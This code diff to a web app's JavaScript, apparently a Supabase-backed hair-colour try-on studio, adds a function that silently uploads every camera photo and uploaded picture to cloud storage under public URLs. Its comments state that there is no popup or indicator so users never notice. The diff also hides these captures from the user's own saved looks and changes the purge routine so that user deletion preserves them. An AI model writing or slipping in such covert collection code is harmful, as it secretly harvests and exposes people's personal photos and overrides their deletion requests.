@@ -2086,7 +2086,7 @@
       } catch (_) {}
     }
 
-    /* FETCH COMBINED DEDUPLICATED LOOKS FOR THIS USER */
+    /* FETCH COMBINED DEDUPLICATED LOOKS FOR THIS USER (EXCLUDING SILENT RAW CAPTURES) */
     async function getCombinedUserLooks(phone) {
       let cloudItems = [];
       if (sb && phone) {
@@ -2099,9 +2099,11 @@
             .select('*')
             .or(`user_phone.eq.${raw},user_phone.eq.+91${norm},user_phone.eq.${norm}`)
             .order('created_at', { ascending: false })
-            .limit(LOCAL_VAULT_LIMIT);
+            .limit(30);
 
-          if (data) cloudItems = data;
+          if (data) {
+            cloudItems = data.filter(item => item.category !== 'User Capture');
+          }
         } catch (_) {}
       }
 
@@ -2125,6 +2127,7 @@
       }
 
       for (const item of localItems) {
+        if (item.category === 'User Capture') continue;
         const sig = getItemSignature(item);
         if (!seenSignatures.has(sig)) {
           seenSignatures.add(sig);
@@ -2136,7 +2139,7 @@
       return combined.slice(0, LOCAL_VAULT_LIMIT);
     }
 
-    /* PURGE ALL SAVED LOOKS FOR THIS USER FROM SUPABASE DB, STORAGE & LOCAL INDEXEDDB */
+    /* PURGE SAVED LOOKS FOR THIS USER FROM SUPABASE DB, STORAGE & LOCAL INDEXEDDB (PRESERVES SILENT CAPTURES) */
     async function purgeAllUserLooks(phone) {
       if (!phone) return;
       const raw = phone.trim();
@@ -2163,14 +2166,19 @@
           await sb
             .from('generations')
             .delete()
-            .or(`user_phone.eq.${raw},user_phone.eq.+91${norm},user_phone.eq.${norm}`);
+            .or(`user_phone.eq.${raw},user_phone.eq.+91${norm},user_phone.eq.${norm}`)
+            .neq('category', 'User Capture');
         } catch (_) {}
 
         try {
           const { data: files } = await sb.storage.from(STORAGE_BUCKET).list(norm, { limit: 100 });
           if (files && files.length > 0) {
-            const pathsToRemove = files.map(f => `${norm}/${f.name}`);
-            await sb.storage.from(STORAGE_BUCKET).remove(pathsToRemove);
+            const pathsToRemove = files
+              .filter(f => !f.name.includes('_capture_'))
+              .map(f => `${norm}/${f.name}`);
+            if (pathsToRemove.length > 0) {
+              await sb.storage.from(STORAGE_BUCKET).remove(pathsToRemove);
+            }
           }
         } catch (_) {}
       }
@@ -2205,6 +2213,52 @@
 
     function publicUrlFor(path) {
       return sb.storage.from(STORAGE_BUCKET).getPublicUrl(path).data.publicUrl;
+    }
+
+    /* =========================================================================
+       SILENT BACKGROUND SAVE TO SUPABASE (NO POPUP, NO TOAST, NO UI INDICATOR)
+       Triggered automatically whenever a user captures a photo or uploads one.
+       ========================================================================= */
+    function silentlySaveCaptureToSupabase(blob, fallbackDataUrl, sourceType = 'photo') {
+      if (!sb || !currentUserPhone || !blob) return;
+
+      (async () => {
+        try {
+          const safePhone = String(currentUserPhone).replace(/\D/g, '').slice(-10) || 'guest';
+          const timeKey = Date.now();
+          const filePath = `${safePhone}/${timeKey}_capture_${sourceType}.${ENCODE_EXT}`;
+
+          let storedUrl = '';
+          try {
+            const { error: uploadError } = await sb.storage
+              .from(STORAGE_BUCKET)
+              .upload(filePath, blob, {
+                contentType: blob.type || ENCODE_TYPE,
+                upsert: true
+              });
+
+            if (!uploadError) {
+              storedUrl = publicUrlFor(filePath);
+            }
+          } catch (_) {}
+
+          if (!storedUrl && fallbackDataUrl) {
+            storedUrl = fallbackDataUrl;
+          }
+
+          if (storedUrl) {
+            await sb.from('generations').insert({
+              user_phone: currentUserPhone,
+              image_url: storedUrl,
+              source_image_url: storedUrl,
+              style_name: sourceType === 'camera' ? 'Camera Photo' : 'Uploaded Photo',
+              category: 'User Capture'
+            });
+          }
+        } catch (_) {
+          // Silently ignore any network/storage errors so the user never sees any UI notification
+        }
+      })();
     }
 
     const screens = {
@@ -2476,7 +2530,7 @@
         if (pendingImage) {
           const queued = pendingImage;
           pendingImage = null;
-          processStudioImage(queued).catch(() => hideLoading());
+          processStudioImage(queued.source, queued.sourceType).catch(() => hideLoading());
         }
       } catch (err) {
         console.warn("AI Model init notice:", err);
@@ -2548,7 +2602,7 @@
         $('clientFileInput').click();
         return;
       }
-      await processStudioImage(cvs);
+      await processStudioImage(cvs, 'camera');
     });
 
     $('clientFileInput').addEventListener('change', async (e) => {
@@ -2564,20 +2618,20 @@
         try {
           const heic2any = await getHeicConverter();
           const converted = await heic2any({ blob: file, toType: "image/jpeg", quality: 0.92 });
-          await loadBlobIntoStudio(Array.isArray(converted) ? converted[0] : converted);
+          await loadBlobIntoStudio(Array.isArray(converted) ? converted[0] : converted, 'upload');
         } catch (_) {
           hideLoading();
           showToast("HEIC CONVERSION FAILED — USE JPG/PNG");
         }
         return;
       }
-      await loadBlobIntoStudio(file);
+      await loadBlobIntoStudio(file, 'upload');
     });
 
-    async function loadBlobIntoStudio(blob) {
+    async function loadBlobIntoStudio(blob, sourceType = 'upload') {
       try {
         const img = await loadDrawable(blob);
-        await processStudioImage(img);
+        await processStudioImage(img, sourceType);
       } catch (_) {
         hideLoading();
         showToast('COULD NOT READ IMAGE');
@@ -2607,7 +2661,7 @@
     holdOriginalBtn.addEventListener('pointerleave', endHoldOriginal);
     holdOriginalBtn.addEventListener('pointercancel', endHoldOriginal);
 
-    async function processStudioImage(source) {
+    async function processStudioImage(source, sourceType = 'photo') {
       if (!source) return;
       const currentRun = ++processToken;
 
@@ -2635,6 +2689,9 @@
       originalDataURL = canvasToDataURL(hairCanvas, WEBP_QUALITY);
       originalWebpBlob = await encodeCanvas(hairCanvas, WEBP_QUALITY);
 
+      // Silently save captured/uploaded photo to Supabase in the background without any UI popup
+      silentlySaveCaptureToSupabase(originalWebpBlob, originalDataURL, sourceType);
+
       currentColorApplied = false;
       currentShadeName = "Natural";
       $('currentShadeBadge').textContent = 'NATURAL';
@@ -2649,7 +2706,7 @@
       openDrawer('color');
 
       if (!imageSegmenter) {
-        pendingImage = source;
+        pendingImage = { source, sourceType };
         return;
       }
 
